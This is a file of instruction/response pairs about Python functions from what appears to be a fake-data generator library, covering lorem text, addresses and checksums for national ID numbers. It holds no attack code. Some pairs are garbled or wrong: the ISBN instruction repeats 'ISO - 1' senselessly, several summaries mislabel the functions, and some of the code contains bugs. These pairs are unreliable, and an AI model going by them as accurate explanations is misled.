{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an array of paragraphs containing nb paragraphs.", "response": "def paragraphs(self, nb=3, ext_word_list=None):\n        \"\"\"\n        Generate an array of paragraphs\n        :example [paragraph1, paragraph2, paragraph3]\n        :param nb: how many paragraphs to return\n        :param ext_word_list: a list of words you would like to have instead of\n            'Lorem ipsum'.\n\n        :rtype: list\n        \"\"\"\n\n        return [self.paragraph(ext_word_list=ext_word_list)\n                for _ in range(0, nb)]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef text(self, max_nb_chars=200, ext_word_list=None):\n        text = []\n        if max_nb_chars < 5:\n            raise ValueError(\n                'text() can only generate text of at least 5 characters')\n\n        if max_nb_chars < 25:\n            # join words\n            while not text:\n                size = 0\n                # determine how many words are needed to reach the $max_nb_chars\n                # once;\n                while size < max_nb_chars:\n                    word = (self.word_connector if size else '') + \\\n                        self.word(ext_word_list=ext_word_list)\n                    text.append(word)\n                    size += len(word)\n                text.pop()\n            text[0] = text[0][0].upper() + text[0][1:]\n            last_index = len(text) - 1\n            text[last_index] += self.sentence_punctuation\n        elif max_nb_chars < 100:\n            # join sentences\n            while not text:\n                size = 0\n                # determine how many sentences are needed to reach the\n                # $max_nb_chars once\n                while size < max_nb_chars:\n                    sentence = (self.word_connector if size else '') + \\\n                        self.sentence(ext_word_list=ext_word_list)\n                    text.append(sentence)\n                    size += len(sentence)\n                text.pop()\n        else:\n            # join paragraphs\n            while not text:\n                size = 0\n                # determine how many paragraphs are needed to reach the\n                # $max_nb_chars once\n                while size < max_nb_chars:\n                    paragraph = ('\\n' if size else '') + \\\n                        self.paragraph(ext_word_list=ext_word_list)\n                    text.append(paragraph)\n                    size += len(paragraph)\n                text.pop()\n\n        return \"\".join(text)", "response": "Generates a text string of the current language."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef city(self):\n        pattern = self.random_element(self.city_formats)\n        return self.generator.parse(pattern)", "response": "returns a random city name"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef street_name(self):\n        pattern = self.random_element(self.street_name_formats)\n        return self.generator.parse(pattern)", "response": "returns random street name"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef street_address(self):\n        pattern = self.random_element(self.street_address_formats)\n        return self.generator.parse(pattern)", "response": "returns random street address"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets a random address", "response": "def address(self):\n        \"\"\"\n        :example '791 Crist Parks, Sashabury, IL 86039-9874'\n        \"\"\"\n        pattern = self.random_element(self.address_formats)\n        return self.generator.parse(pattern)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef slugify(value, allow_dots=False, allow_unicode=False):\n    if allow_dots:\n        pattern = _re_pattern_allow_dots\n    else:\n        pattern = _re_pattern\n\n    value = six.text_type(value)\n    if allow_unicode:\n        value = unicodedata.normalize('NFKC', value)\n        value = pattern.sub('', value).strip().lower()\n        return _re_spaces.sub('-', value)\n    value = unicodedata.normalize('NFKD', value).encode(\n        'ascii', 'ignore').decode('ascii')\n    value = pattern.sub('', value).strip().lower()\n    return _re_spaces.sub('-', value)", "response": "Converts to lowercase removes non - word characters underscores and hyphens and converts spaces to hyphens."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a random string from the postal_code_formats and replaces all question marks with a random letter and passes result to numerify to insert numbers", "response": "def postcode(self):\n        \"\"\"\n        Replaces all question mark ('?') occurrences with a random letter\n        from postal_code_formats then passes result to\n        numerify to insert numbers\n        \"\"\"\n        temp = re.sub(r'\\?',\n                      lambda x: self.postal_code_letter(),\n                      self.random_element(self.postal_code_formats))\n        return self.numerify(temp)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncalculate and returns a control digit for given list of digits based on REGON standard.", "response": "def regon_checksum(digits):\n    \"\"\"\n    Calculates and returns a control digit for given list of digits basing on REGON standard.\n    \"\"\"\n    weights_for_check_digit = [8, 9, 2, 3, 4, 5, 6, 7]\n    check_digit = 0\n\n    for i in range(0, 8):\n        check_digit += weights_for_check_digit[i] * digits[i]\n\n    check_digit %= 11\n\n    if check_digit == 10:\n        check_digit = 0\n\n    return check_digit"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef local_regon_checksum(digits):\n    weights_for_check_digit = [2, 4, 8, 5, 0, 9, 7, 3, 6, 1, 2, 4, 8]\n    check_digit = 0\n\n    for i in range(0, 13):\n        check_digit += weights_for_check_digit[i] * digits[i]\n\n    check_digit %= 11\n\n    if check_digit == 10:\n        check_digit = 0\n\n    return check_digit", "response": "Calculates and returns a control digit for given list of digits based on local REGON standard."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef company_vat_checksum(digits):\n    weights_for_check_digit = [6, 5, 7, 2, 3, 4, 5, 6, 7]\n    check_digit = 0\n\n    for i in range(0, 9):\n        check_digit += weights_for_check_digit[i] * digits[i]\n\n    check_digit %= 11\n\n    return check_digit", "response": "Calculates and returns a control digit for given list of digits based on NIP standard."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef regon(self):\n        voivodeship_number = self.random_int(0, 49) * 2 + 1\n        regon_digits = [int(voivodeship_number / 10), voivodeship_number % 10]\n\n        for _ in range(6):\n            regon_digits.append(self.random_digit())\n\n        regon_digits.append(regon_checksum(regon_digits))\n\n        return ''.join(str(digit) for digit in regon_digits)", "response": "Returns 9 character Polish National Business Registry Number"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef local_regon(self):\n        regon_digits = [int(digit) for digit in list(self.regon())]\n\n        for _ in range(4):\n            regon_digits.append(self.random_digit())\n\n        regon_digits.append(local_regon_checksum(regon_digits))\n\n        return ''.join(str(digit) for digit in regon_digits)", "response": "Returns 14 character Polish National Business Registry Number local entity number."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning 10 character tax identification number", "response": "def company_vat(self):\n        \"\"\"\n        Returns 10 character tax identification number,\n        Polish: Numer identyfikacji podatkowej.\n\n        https://pl.wikipedia.org/wiki/NIP\n        \"\"\"\n        vat_digits = []\n\n        for _ in range(3):\n            vat_digits.append(self.random_digit_not_null())\n\n        for _ in range(6):\n            vat_digits.append(self.random_digit())\n\n        check_digit = company_vat_checksum(vat_digits)\n\n        # in this case we must generate a tax number again, because check_digit\n        # cannot be 10\n        if check_digit == 10:\n            return self.company_vat()\n\n        vat_digits.append(check_digit)\n\n        return ''.join(str(digit) for digit in vat_digits)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the checksum of CPF digits.", "response": "def checksum(digits):\n    \"\"\"\n    Returns the checksum of CPF digits.\n    References to the algorithm:\n    https://pt.wikipedia.org/wiki/Cadastro_de_pessoas_f%C3%ADsicas#Algoritmo\n    https://metacpan.org/source/MAMAWE/Algorithm-CheckDigits-v1.3.0/lib/Algorithm/CheckDigits/M11_004.pm\n    \"\"\"\n    s = 0\n    p = len(digits) + 1\n    for i in range(0, len(digits)):\n        s += digits[i] * p\n        p -= 1\n\n    reminder = s % 11\n    if reminder == 0 or reminder == 1:\n        return 0\n    else:\n        return 11 - reminder"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating the information required to create an ISBN - 10 or ISBN - 13 or ISO - 1 or ISO - 1 or ISO - 1 or ISO - 1 or ISO - 1 or ISO - 1 or ISO - 1.", "response": "def _body(self):\n        \"\"\" Generate the information required to create an ISBN-10 or\n        ISBN-13.\n        \"\"\"\n        ean = self.random_element(RULES.keys())\n        reg_group = self.random_element(RULES[ean].keys())\n\n        # Given the chosen ean/group, decide how long the\n        #   registrant/publication string may be.\n        # We must allocate for the calculated check digit, so\n        #   subtract 1\n        reg_pub_len = ISBN.MAX_LENGTH - len(ean) - len(reg_group) - 1\n\n        # Generate a registrant/publication combination\n        reg_pub = self.numerify('#' * reg_pub_len)\n\n        # Use rules to separate the registrant from the publication\n        rules = RULES[ean][reg_group]\n        registrant, publication = self._registrant_publication(reg_pub, rules)\n        return [ean, reg_group, registrant, publication]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nseparates the registration from the publication in a given string.", "response": "def _registrant_publication(reg_pub, rules):\n        \"\"\" Separate the registration from the publication in a given\n        string.\n        :param reg_pub: A string of digits representing a registration\n            and publication.\n        :param rules: A list of RegistrantRules which designate where\n            to separate the values in the string.\n        :returns: A (registrant, publication) tuple of strings.\n        \"\"\"\n        for rule in rules:\n            if rule.min <= reg_pub <= rule.max:\n                reg_len = rule.registrant_length\n                break\n        else:\n            raise Exception('Registrant/Publication not found in registrant '\n                            'rule list.')\n        registrant, publication = reg_pub[:reg_len], reg_pub[reg_len:]\n        return registrant, publication"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ssn(self):\n        digits = []\n\n        # Number of days between 1899-12-31 and a birth date\n        for digit in str((self.generator.date_object() -\n                          date(1899, 12, 31)).days):\n            digits.append(int(digit))\n\n        # Person's sequence number\n        for _ in range(4):\n            digits.append(self.random_int(0, 9))\n\n        checksum = (digits[0] * -1 + digits[1] * 5 + digits[2] * 7 + digits[3] * 9 +\n                    digits[4] * 4 + digits[5] * 6 + digits[6] * 10 + digits[7] * 5 +\n                    digits[8] * 7)\n        # Remainder of a checksum divided by 11 or 1 if it equals to 10\n        digits.append(checksum % 11 % 10)\n\n        return ''.join(str(digit) for digit in digits)", "response": "Generate a random S - N string."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef state_abbr(self, include_territories=True):\n        if include_territories:\n            self.random_element(self.states_and_territories_abbr)\n        return self.random_element(self.states_abbr)", "response": "Returns a random state or territory abbreviation."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating a random string of upper and lowercase letters.", "response": "def pystr(self, min_chars=None, max_chars=20):\n        \"\"\"\n        Generates a random string of upper and lowercase letters.\n        :type min_chars: int\n        :type max_chars: int\n        :return: String. Random of random length between min and max characters.\n        \"\"\"\n        if min_chars is None:\n            return \"\".join(self.random_letters(length=max_chars))\n        else:\n            assert (\n                max_chars >= min_chars), \"Maximum length must be greater than or equal to minium length\"\n            return \"\".join(\n                self.random_letters(\n                    length=self.generator.random.randint(min_chars, max_chars),\n                ),\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef pydict(self, nb_elements=10, variable_nb_elements=True, *value_types):\n        if variable_nb_elements:\n            nb_elements = self.randomize_nb_elements(nb_elements, min=1)\n\n        return dict(zip(\n            self.generator.words(nb_elements),\n            self._pyiterable(nb_elements, False, *value_types),\n        ))", "response": "Returns a dictionary of the n elements of the class."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef postcode(self):\n        postcode = ''\n        pattern = self.random_element(self.postcode_formats)\n        for placeholder in pattern:\n            postcode += self.random_element(self._postcode_sets[placeholder])\n        return postcode", "response": "Generate a random postcode from the set of available postcodes."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ssn(self, dob=None, gender=None):\n        # Hungarian SSNs consist of 11 decimal characters, of the following\n        # schema:\n        #\n        #       M EEHHNN SSSK\n        #       \u2191    \u2191    \u2191 \u2191\n        #  gender  bday ser check digit\n        #\n        #\n        #  The M (gender) character\n        #  ------------------------\n        #\n        #  Born <= 1999        Born > 1999\n        #  Male  Female        Male Female\n        #   1      2             3     4\n        #\n        #  It also includes information on original citizenship,but this is\n        #  ignored for the sake of simplicity.\n        #\n        #  Birthday\n        #  --------\n        #\n        #  Simply encoded as EEHHNN.\n        #\n        #\n        #  Serial\n        #  ------\n        #\n        #  These digits differentiate persons born on the same date.\n        #\n        #\n        #  Check digit\n        #  -----------\n        #\n        #  For those born before 1996:\n        #\n        #  k11 = (1k1 + 2k2 + 3k3... 10k10) mod 11\n        #\n        #  That is, you multiply each digit with its ordinal, add it up and\n        #  take it mod 11. After 1996:\n        #\n        #  k11 = (10k1 + 9k2 + 8k3... 1k10) mod 11\n        #\n\n        if dob:\n            E = int(dob[0:2])\n            H = int(dob[2:4])\n            N = int(dob[4:6])\n\n            if E <= 17:\n                # => person born after '99 in all likelihood...\n                if gender:\n                    if gender.upper() == \"F\":\n                        M = 4\n                    elif gender.upper() == \"M\":\n                        M = 3\n                    else:\n                        raise ValueError(\"Unknown gender - specify M or F.\")\n                else:\n                    M = self.generator.random_int(3, 4)\n            else:\n                # => person born before '99.\n                if gender:\n                    if gender.upper() == \"F\":\n                        M = 2\n                    elif gender.upper() == \"M\":\n                        M = 1\n                    else:\n                        raise ValueError(\"Unknown gender - specify M or F.\")\n                else:\n                    M = self.generator.random_int(1, 2)\n        elif gender:\n            # => assume statistically that the person will be born before '99.\n            E = self.generator.random_int(17, 99)\n            H = self.generator.random_int(1, 12)\n            N = self.generator.random_int(1, 30)\n\n            if gender.upper() == \"F\":\n                M = 2\n            elif gender.upper() == \"M\":\n                M = 1\n            else:\n                raise ValueError(\"Unknown gender - specify M or F\")\n        else:\n            M = self.generator.random_int(1, 2)\n            E = self.generator.random_int(17, 99)\n            H = self.generator.random_int(1, 12)\n            N = self.generator.random_int(1, 30)\n\n        H = zfix(H)\n        N = zfix(N)\n        S = \"{}{}{}\".format(self.generator.random_digit(\n        ), self.generator.random_digit(), self.generator.random_digit())\n\n        vdig = \"{M}{E}{H}{N}{S}\".format(M=M, E=E, H=H, N=N, S=S)\n\n        if 17 < E < 97:\n            cum = [(k + 1) * int(v) for k, v in enumerate(vdig)]\n        else:\n            cum = [(10 - k) * int(v) for k, v in enumerate(vdig)]\n\n        K = fmod(reduce(lambda x, y: x + y, cum), 11)\n\n        return vdig + str(int(K))", "response": "Generates Hungarian SSN equivalent for the given date and gender."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a random postcode in the state", "response": "def postcode_in_state(self, state_abbr=None):\n        \"\"\"\n        :example '4703'\n        \"\"\"\n        if state_abbr is None:\n            state_abbr = self.random_element(self.states_abbr)\n\n        if state_abbr in self.states_abbr:\n            postcode = \"%d\" % (self.generator.random.randint(\n                            self.states_postcode[state_abbr][0],\n                            self.states_postcode[state_abbr][1]))\n\n            if len(postcode) == 3:\n                postcode = \"0%s\" % postcode\n\n            return postcode\n\n        else:\n            raise Exception('State Abbreviation not found in list')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef ssn(self):\n        # see http://nl.wikipedia.org/wiki/Burgerservicenummer (in Dutch)\n        def _checksum(digits):\n            factors = (9, 8, 7, 6, 5, 4, 3, 2, -1)\n            s = 0\n            for i in range(len(digits)):\n                s += digits[i] * factors[i]\n            return s\n\n        while True:\n            # create an array of first 8 elements initialized randomly\n            digits = self.generator.random.sample(range(10), 8)\n            # sum those 8 digits according to (part of) the \"11-proef\"\n            s = _checksum(digits)\n            # determine the last digit to make it qualify the test\n            digits.append((s % 11) % 10)\n            # repeat steps until it does qualify the test\n            if 0 == (_checksum(digits) % 11):\n                break\n\n        # build the resulting BSN\n        bsn = \"\".join([str(e) for e in digits])\n        # finally return our random but valid BSN\n        return bsn", "response": "Returns a 9 digits Dutch SSN called burgerservicenummer ( BSN )."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef checksum(digits):\n    remainder = 10\n    for digit in digits:\n        remainder = (remainder + digit) % 10\n        if remainder == 0:\n            remainder = 10\n        remainder = (remainder * 2) % 11\n\n    control_digit = 11 - remainder\n    if control_digit == 10:\n        control_digit = 0\n    return control_digit", "response": "Calculate and return control digit for given list of digits based on ISO7064 MOD 11 10 standard."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncalculating the checksum of Estonian personal identity code.", "response": "def checksum(digits):\n    \"\"\"Calculate checksum of Estonian personal identity code.\n\n    Checksum is calculated with \"Modulo 11\" method using level I or II scale:\n    Level I scale: 1 2 3 4 5 6 7 8 9 1\n    Level II scale: 3 4 5 6 7 8 9 1 2 3\n\n    The digits of the personal code are multiplied by level I scale and summed;\n    if remainder of modulo 11 of the sum is less than 10, checksum is the\n    remainder.\n    If remainder is 10, then level II scale is used; checksum is remainder if\n    remainder < 10 or 0 if remainder is 10.\n\n    See also https://et.wikipedia.org/wiki/Isikukood\n    \"\"\"\n    sum_mod11 = sum(map(operator.mul, digits, Provider.scale1)) % 11\n    if sum_mod11 < 10:\n        return sum_mod11\n    sum_mod11 = sum(map(operator.mul, digits, Provider.scale2)) % 11\n    return 0 if sum_mod11 == 10 else sum_mod11"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ssn(self, min_age=16, max_age=90):\n        age = datetime.timedelta(\n            days=self.generator.random.randrange(\n                min_age * 365, max_age * 365))\n        birthday = datetime.date.today() - age\n        if birthday.year < 2000:\n            ik = self.generator.random.choice(('3', '4'))\n        elif birthday.year < 2100:\n            ik = self.generator.random.choice(('5', '6'))\n        else:\n            ik = self.generator.random.choice(('7', '8'))\n\n        ik += \"%02d%02d%02d\" % ((birthday.year % 100), birthday.month,\n                                birthday.day)\n        ik += str(self.generator.random.randrange(0, 999)).zfill(3)\n        return ik + str(checksum([int(ch) for ch in ik]))", "response": "Generate a random SSS number."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef coordinate(self, center=None, radius=0.001):\n        if center is None:\n            return Decimal(str(self.generator.random.randint(-180000000, 180000000) / 1000000.0)).quantize(\n                Decimal(\".000001\"),\n            )\n        else:\n            center = float(center)\n            radius = float(radius)\n            geo = self.generator.random.uniform(center - radius, center + radius)\n            return Decimal(str(geo)).quantize(Decimal(\".000001\"))", "response": "Return a random coordinate of the class."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a random latlng from the list of locations known to exist on land in a country specified by country_code.", "response": "def local_latlng(self, country_code='US', coords_only=False):\n        \"\"\"Returns a location known to exist on land in a country specified by `country_code`.\n        Defaults to 'en_US'. See the `land_coords` list for available locations/countries.\n        \"\"\"\n        results = [loc for loc in self.land_coords if loc[3] == country_code]\n        if results:\n            place = self.random_element(results)\n            return (place[0], place[1]) if coords_only else place"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef location_on_land(self, coords_only=False):\n        place = self.random_element(self.land_coords)\n        return (place[0], place[1]) if coords_only else place", "response": "Returns a random tuple specifying a coordinate set guaranteed to exist on land."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef checksum(digits):\n    weights_for_check_digit = [9, 7, 3, 1, 9, 7, 3, 1, 9, 7]\n    check_digit = 0\n\n    for i in range(0, 10):\n        check_digit += weights_for_check_digit[i] * digits[i]\n\n    check_digit %= 10\n\n    return check_digit", "response": "Calculates and returns a control digit for given list of digits based on PESEL standard."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef calculate_month(birth_date):\n    year = int(birth_date.strftime('%Y'))\n    month = int(birth_date.strftime('%m')) + ((int(year / 100) - 14) % 5) * 20\n\n    return month", "response": "Calculates and returns a month number based on PESEL standard."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning 11 character Polish national identity code.", "response": "def ssn(self):\n        \"\"\"\n        Returns 11 character Polish national identity code (Public Electronic Census System,\n        Polish: Powszechny Elektroniczny System Ewidencji Ludno\u015bci - PESEL).\n\n        It has the form YYMMDDZZZXQ, where YYMMDD is the date of birth (with century\n        encoded in month field), ZZZ is the personal identification number, X denotes sex\n        (even for females, odd for males) and Q is a parity number.\n\n        https://en.wikipedia.org/wiki/National_identification_number#Poland\n        \"\"\"\n        birth_date = self.generator.date_time()\n\n        year_without_century = int(birth_date.strftime('%y'))\n        month = calculate_month(birth_date)\n        day = int(birth_date.strftime('%d'))\n\n        pesel_digits = [\n            int(year_without_century / 10),\n            year_without_century % 10,\n            int(month / 10),\n            month % 10,\n            int(day / 10), day % 10,\n        ]\n\n        for _ in range(4):\n            pesel_digits.append(self.random_digit())\n\n        pesel_digits.append(checksum(pesel_digits))\n\n        return ''.join(str(digit) for digit in pesel_digits)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a 13 digits Swiss SSN named AHV or AVS and French and Italian", "response": "def ssn(self):\n        \"\"\"\n        Returns a 13 digits Swiss SSN named AHV (German) or\n                                            AVS (French and Italian)\n        See: http://www.bsv.admin.ch/themen/ahv/00011/02185/\n        \"\"\"\n        def _checksum(digits):\n            evensum = sum(digits[:-1:2])\n            oddsum = sum(digits[1::2])\n            return (10 - ((evensum + oddsum * 3) % 10)) % 10\n\n        digits = [7, 5, 6]\n        # create an array of first 9 elements initialized randomly\n        digits += self.generator.random.sample(range(10), 9)\n        # determine the last digit to make it qualify the test\n        digits.append(_checksum(digits))\n        # repeat steps until it does qualify the test\n\n        digits = ''.join([str(d) for d in digits])\n        ssn = digits[:3] + '.' \\\n                         + digits[3:7] + '.' \\\n                         + digits[7:11] + '.' \\\n                         + digits[11:]\n        return ssn"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn Swiss UID number of the VAT in the current locale.", "response": "def vat_id(self):\n        \"\"\"\n        :return: Swiss UID number\n        \"\"\"\n        def _checksum(digits):\n            code = ['8', '6', '4', '2', '3', '5', '9', '7']\n            remainder = 11-(sum(map(lambda x, y: int(x) * int(y), code, digits)) % 11)\n            if remainder == 10:\n                return 0\n            elif remainder == 11:\n                return 5\n            return remainder\n\n        vat_id = self.bothify('########')\n        return 'CHE' + vat_id + str(_checksum(vat_id))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef random_int(self, min=0, max=9999, step=1):\n        return self.generator.random.randrange(min, max + 1, step)", "response": "Returns a random integer between two values."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a random digit or an empty string.", "response": "def random_digit_or_empty(self):\n        \"\"\"\n        Returns a random digit/number\n        between 0 and 9 or an empty string.\n        \"\"\"\n        if self.generator.random.randint(0, 1):\n            return self.generator.random.randint(0, 9)\n        else:\n            return ''"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a random non - zero digit or an empty string.", "response": "def random_digit_not_null_or_empty(self):\n        \"\"\"\n        Returns a random non-zero digit/number\n        between 1 and 9 or and empty string.\n        \"\"\"\n        if self.generator.random.randint(0, 1):\n            return self.generator.random.randint(1, 9)\n        else:\n            return ''"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef random_number(self, digits=None, fix_len=False):\n        if digits is None:\n            digits = self.random_digit()\n        if fix_len:\n            return self.generator.random.randint(\n                pow(10, digits - 1), pow(10, digits) - 1)\n        else:\n            return self.generator.random.randint(0, pow(10, digits) - 1)", "response": "Returns a random number with 1 digit or fixed length number"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef random_letter(self):\n        return self.generator.random.choice(\n            getattr(string, 'letters', string.ascii_letters))", "response": "Returns a random letter between a - z and A - Z."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a random letter between a - z and A - Z.", "response": "def random_letters(self, length=16):\n        \"\"\"Returns a random letter (between a-z and A-Z).\"\"\"\n        return self.random_choices(\n            getattr(string, 'letters', string.ascii_letters),\n            length=length,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of random non - unique elements from a passed object.", "response": "def random_choices(self, elements=('a', 'b', 'c'), length=None):\n        \"\"\"\n        Returns a list of random, non-unique elements from a passed object.\n\n        If `elements` is a dictionary, the value will be used as\n        a weighting element. For example::\n\n            random_element({\"{{variable_1}}\": 0.5, \"{{variable_2}}\": 0.2, \"{{variable_3}}\": 0.2, \"{{variable_4}}\": 0.1})\n\n        will have the following distribution:\n            * `variable_1`: 50% probability\n            * `variable_2`: 20% probability\n            * `variable_3`: 20% probability\n            * `variable_4`: 10% probability\n\n        \"\"\"\n        return self.random_elements(elements, length, unique=False)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of random unique elements for the specified length.", "response": "def random_sample(self, elements=('a', 'b', 'c'), length=None):\n        \"\"\"\n        Returns a list of random unique elements for the specified length.\n        Multiple occurrences of the same value increase its probability to be in the output.\n        \"\"\"\n        return self.random_elements(elements, length, unique=True)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef randomize_nb_elements(\n            self,\n            number=10,\n            le=False,\n            ge=False,\n            min=None,\n            max=None):\n        \"\"\"\n        Returns a random value near number.\n\n        :param number: value to which the result must be near\n        :param le: result must be lower or equal to number\n        :param ge: result must be greater or equal to number\n        :returns: a random int near number\n        \"\"\"\n        if le and ge:\n            return number\n        _min = 100 if ge else 60\n        _max = 100 if le else 140\n        nb = int(number * self.generator.random.randint(_min, _max) / 100)\n        if min is not None and nb < min:\n            nb = min\n        if max is not None and nb > min:\n            nb = max\n        return nb", "response": "Returns a random value near number."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef numerify(self, text='###'):\n        text = _re_hash.sub(\n            lambda x: str(self.random_digit()),\n            text)\n        text = _re_perc.sub(\n            lambda x: str(self.random_digit_not_null()),\n            text)\n        text = _re_excl.sub(\n            lambda x: str(self.random_digit_or_empty()),\n            text)\n        text = _re_at.sub(\n            lambda x: str(self.random_digit_not_null_or_empty()),\n            text)\n        return text", "response": "Replaces all placeholders in given text with randomized values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreplace all question mark occurrences with a random letter.", "response": "def lexify(self, text='????', letters=string.ascii_letters):\n        \"\"\"\n        Replaces all question mark ('?') occurrences with a random letter.\n\n        :param text: string to be parsed\n        :param letters: a set of letters to choose from.\n        :returns: string with all letter placeholders filled in\n        \"\"\"\n        return _re_qm.sub(lambda x: self.random_element(letters), text)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreplace all placeholders with random numbers and letters.", "response": "def bothify(self, text='## ??', letters=string.ascii_letters):\n        \"\"\"\n        Replaces all placeholders with random numbers and letters.\n\n        :param text: string to be parsed\n        :returns: string with all numerical and letter placeholders filled in\n        \"\"\"\n        return self.lexify(self.numerify(text), letters=letters)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreplacing all circumflex ('^') occurrences with a random hexadecimal character.", "response": "def hexify(self, text='^^^^', upper=False):\n        \"\"\"\n        Replaces all circumflex ('^') occurrences with a random\n        hexadecimal character.\n\n        :param text: string to be parsed\n        :param upper: Format as uppercase hexadecimal\n        :returns: string with all letter placeholders filled in\n        \"\"\"\n        letters = string.hexdigits[:-6]\n        if upper:\n            letters = letters.upper()\n        return _re_cir.sub(lambda x: self.random_element(letters), text)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncalculating the checksum of Norwegian personal identity code.", "response": "def checksum(digits, scale):\n    \"\"\"\n    Calculate checksum of Norwegian personal identity code.\n\n    Checksum is calculated with \"Module 11\" method using a scale.\n    The digits of the personal code are multiplied by the corresponding\n    number in the scale and summed;\n    if remainder of module 11 of the sum is less than 10, checksum is the\n    remainder.\n    If remainder is 0, the checksum is 0.\n\n    https://no.wikipedia.org/wiki/F%C3%B8dselsnummer\n    \"\"\"\n    chk_nbr = 11 - (sum(map(operator.mul, digits, scale)) % 11)\n    if chk_nbr == 11:\n        return 0\n    return chk_nbr"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ssn(self, dob=None, gender=None):\n\n        if dob:\n            birthday = datetime.datetime.strptime(dob, '%Y%m%d')\n        else:\n            age = datetime.timedelta(\n                days=self.generator.random.randrange(18 * 365, 90 * 365))\n            birthday = datetime.datetime.now() - age\n        if not gender:\n            gender = self.generator.random.choice(('F', 'M'))\n        elif gender not in ('F', 'M'):\n            raise ValueError('Gender must be one of F or M.')\n\n        while True:\n            if 1900 <= birthday.year <= 1999:\n                suffix = str(self.generator.random.randrange(0, 49))\n            elif 1854 <= birthday.year <= 1899:\n                suffix = str(self.generator.random.randrange(50, 74))\n            elif 2000 <= birthday.year <= 2039:\n                suffix = str(self.generator.random.randrange(50, 99))\n            elif 1940 <= birthday.year <= 1999:\n                suffix = str(self.generator.random.randrange(90, 99))\n            if gender == 'F':\n                gender_num = self.generator.random.choice((0, 2, 4, 6, 8))\n            elif gender == 'M':\n                gender_num = self.generator.random.choice((1, 3, 5, 7, 9))\n            pnr = birthday.strftime('%d%m%y') + suffix.zfill(2) + str(gender_num)\n            pnr_nums = [int(ch) for ch in pnr]\n            k1 = checksum(Provider.scale1, pnr_nums)\n            k2 = checksum(Provider.scale2, pnr_nums + [k1])\n            # Checksums with a value of 10 is rejected.\n            # https://no.wikipedia.org/wiki/F%C3%B8dselsnummer\n            if k1 == 10 or k2 == 10:\n                continue\n            pnr += '{}{}'.format(k1, k2)\n            return pnr", "response": "Returns a 11 character Norwegian personal identity code."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef nie(self):\n\n        first_chr = random.randrange(0, 3)\n        doi_body = str(random.randrange(0, 10000000)).zfill(7)\n        control = self._calculate_control_doi(str(first_chr) + doi_body)\n        return \"XYZ\"[first_chr] + doi_body + control", "response": "a random Spanish NIE"}
